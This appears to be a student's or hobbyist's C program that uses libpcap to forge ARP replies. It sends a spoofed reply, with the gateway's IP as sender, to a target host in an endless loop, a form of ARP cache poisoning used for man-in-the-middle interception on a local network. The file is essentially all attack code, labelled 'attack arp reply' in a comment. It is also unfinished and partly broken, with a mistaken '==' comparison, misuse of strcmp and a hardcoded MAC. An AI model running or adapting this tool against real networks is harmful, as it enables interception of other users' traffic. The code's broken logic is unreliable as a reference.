#include <pcap.h>
#include "protocol_information.h"
#include "printfunc.h"
    #include <stdio.h>
#include <arpa/inet.h>
#define ETHERTYPE_IP 0x0800
#define ETHERTYPE_ARP 0X0806

     int main(int argc, char *argv[])
     {
	u_char send_packet_arprequest[42]={0xFF, 0xFF, 0xFF, 0xFF, 0xFF ,0xFF, 0x94, 0xE9,
					 0x79, 0x95 ,0x00, 0xFD, 0x08, 0x06, 0x00, 0x01,
					 0x08, 0x00, 0x06, 0x04 , 0x00 , 0x01 , 0x94 , 0xE9,
					 0x79 , 0x95 , 0x00 , 0xFD , 0xC0 , 0xA8 , 0x2B , 0x45,
					 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0xC0 , 0xA8,
					 0x2B , 0x01};

					 
	u_char send_packet_arpreply[42]={0xFF, 0xFF, 0xFF, 0xFF, 0xFF ,0xFF, 0x94, 0xE9,
					 0x79, 0x95 ,0x00, 0xFD, 0x08, 0x06, 0x00, 0x01,
					 0x08, 0x00, 0x06, 0x04 , 0x00 , 0x02 , 0x94 , 0xE9,
					 0x79 , 0x95 , 0x00 , 0xFD , 0xC0 , 0xA8 , 0x2B , 0x45,
					 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0xC0 , 0xA8,
					 0x2B , 0x01};

	u_char receive_packet[42];


        pcap_t *handle;			/* Session handle */
        char *dev;			/* The device to sniff on */
        char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
        struct bpf_program fp;		/* The compiled filter */
        char filter_exp[] = "port 80";	/* The filter expression */
        bpf_u_int32 mask;		/* Our netmask */
        bpf_u_int32 net;		/* Our IP */
        struct pcap_pkthdr *header;	/* The header that pcap gives us */
        const u_char *packet;		/* The actual packet */

	u_short datalength;
	u_char tcpoff;
	u_char ipoff;
	char ip_dst_str[16];
	char ip_src_str[16];

	struct arphdr *arprequest_arp;
	struct arphdr *arpreply_arp;

	struct arphdr *arp_to_know_targetmac;
	struct sniff_ethernet *ethernet;
	struct sniff_ethernet arprequest_eth;
	struct sniff_ethernet arpreply_eth;
	struct sniff_ip *ip;
	struct sniff_tcp *tcp;
	struct sniff_data *data;

	u_char sender_ip_str[4];
	u_char target_ip_str[4];

	u_char *sender_ip=argv[2];
	u_char *target_ip=argv[3];

	arprequest_arp=(struct arphdr*)(send_packet_arprequest+14);
	arpreply_arp=(struct arphdr*)(send_packet_arpreply+14);

	/* arp request to know target mac address*/
////	arprequest_eth.ether_dhost={0xff,0xff,0xff,0xff,0xff,0xff};
////	arprequest_eth.ether_shost={0x00,0x0c,0x29,0xe8,0xc7,0x22};
////	arprequest_arp.sha={0x00,0x0c,0x29,0xe8,0xc7,0x22};
//	arprequest_arp.spa=htons(0x0001);			//senderip-my ip
////	arprequest_arp.tha={0,};
//	arprequest_arp.tpa=htons(0x0001);			//targetip

	/* attack arp reply */
////	arpreply_eth.ether_dhost={target mac};
////	arpreply_eth.ether_shost={0x00,0x0c,0x29,0xe8,0xc7,0x22}; 
	inet_pton(AF_INET,sender_ip,(*arpreply_arp).spa); //sender ip - gateway
	inet_pton(AF_INET,target_ip,(*arpreply_arp).tpa); //targetip
////	arpreply_arp.sha={0x00,0x0c,0x29,0xe8,0xc7,0x22};
				
////	arpreply_arp.tha={target mac};
			
	
	u_char *target_mac;

        /* Define the device */
        dev = pcap_lookupdev(errbuf);
        if (dev == NULL) {
            fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
            return(2);
        }
        /* Find the properties for the device */
        if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
            fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
            net = 0;
            mask = 0;
        }
        /* Open the session in promiscuous mode */
        handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
        if (handle == NULL) {
            fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
            return(2);
        }
        /* Compile and apply the filter */
        if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
            fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
            return(2);
        }
        if (pcap_setfilter(handle, &fp) == -1) {
            fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
            return(2);
        }

  	  while(1)
	  {
	      	int res;
		 /* Grab a packet */
      		res=pcap_next_ex(handle, &header,&packet);
      	        if(res==0) continue;
		else if(res==-1) break;
		else if(res==-2) break;
		/* Print its length */

		ethernet=(struct sniff_ethernet*)packet;

		if(ntohs((*ethernet).ether_type)==ETHERTYPE_ARP)
	{
		arp_to_know_targetmac==(struct arphdr*)(packet+14);
		if(ntohs((*arp_to_know_targetmac).oper)==0x0002)
		{
			if(strcmp((*arp_to_know_targetmac).spa,target_ip))
			{
				target_mac=(*arp_to_know_targetmac).tha;
			}
		}
	}	



	      	printf("%s\n",sender_ip);
		printf("%s\n",target_ip);
//	      	printf("%2x\n",*((arpreply_arp).spa));
//		printf("%2x\n",*((arpreply_arp).tpa));

		if(pcap_sendpacket(handle,send_packet_arpreply,42)!=0)
		{
			printf("error\n");
		}
	  }

        pcap_close(handle);
        return(0);
     }
